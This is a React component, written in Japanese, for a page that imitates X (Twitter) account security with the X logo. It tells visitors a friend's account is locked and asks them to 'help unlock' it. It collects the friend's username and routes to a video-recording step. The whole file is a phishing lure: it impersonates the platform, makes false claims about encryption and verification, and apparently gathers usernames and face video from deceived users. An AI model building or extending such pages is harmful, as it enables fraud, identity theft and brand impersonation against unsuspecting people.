import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import './VerificationStart.css'

function VerificationStart() {
  const navigate = useNavigate()
  const [step, setStep] = useState(1)
  const [username, setUsername] = useState('')

  const handleContinue = () => {
    if (step === 1) {
      setStep(2)
    } else {
      // Save username to localStorage before navigating
      localStorage.setItem('username', username)
      navigate('/record')
    }
  }

  return (
    <div className="verification-page">
      <div className="verification-container">
        {step === 1 ? (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>
            
            <h1 className="verification-title">Xアカウントセキュリティへようこそ</h1>
            
            <p className="verification-description">
              友達のアカウントアクセスが制限されているため、そのアカウントに
              より高いセキュリティ要件を適用させていただいています。
              友達のアカウントのロックを解除するため、このセキュリティプログラムを作成いたします。
            </p>

            <div className="help-notice">
              <p className="help-text">
                友達がXアカウントに復帰できるよう、本人確認を支援します。
              </p>
            </div>

            <div className="info-box">
              <p className="info-header">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0" style={{marginRight: '8px'}}>
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                以下では、プロセスを詳しく説明し、アカウントロック解除を完全に実行できるよう支援いたします。
              </p>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>短時間10秒動画認証</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>安全で暗号化されたプロセス</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>友達のアクセス復旧支援</span>
              </div>
            </div>

            <button className="btn-continue" onClick={handleContinue}>
              続行
            </button>

            <p className="privacy-note">
              続行することで、友達の本人確認支援に同意したものとみなされます。
              お客様の動画は安全に保存され、友達のXアカウントのロック解除の
              認証目的のみに使用されます。
            </p>
          </div>
        ) : (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>

            <h1 className="verification-title">友達のユーザー名を入力</h1>
            
            <p className="verification-description">
              ロック解除が必要な友達のXユーザー名を入力してください。
            </p>

            <div className="input-group">
              <label htmlFor="username">友達のXユーザー名</label>
              <div className="input-wrapper">
                <span className="input-prefix">@</span>
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="friendusername"
                  className="input-field"
                />
              </div>
            </div>

            <div className="help-box">
              <p>認証することで、以下を確認したものとみなされます：</p>
              <ul>
                <li>この人を個人的に知っている</li>
                <li>アカウントアクセス復旧を支援している</li>
                <li>提供する情報が正確である</li>
              </ul>
            </div>

            <button 
              className="btn-continue" 
              onClick={handleContinue}
              disabled={!username.trim()}
            >
              認証開始
            </button>

            <button className="btn-back" onClick={() => setStep(1)}>
              戻る
            </button>
          </div>
        )}
      </div>
    </div>
  )
}

export default VerificationStart
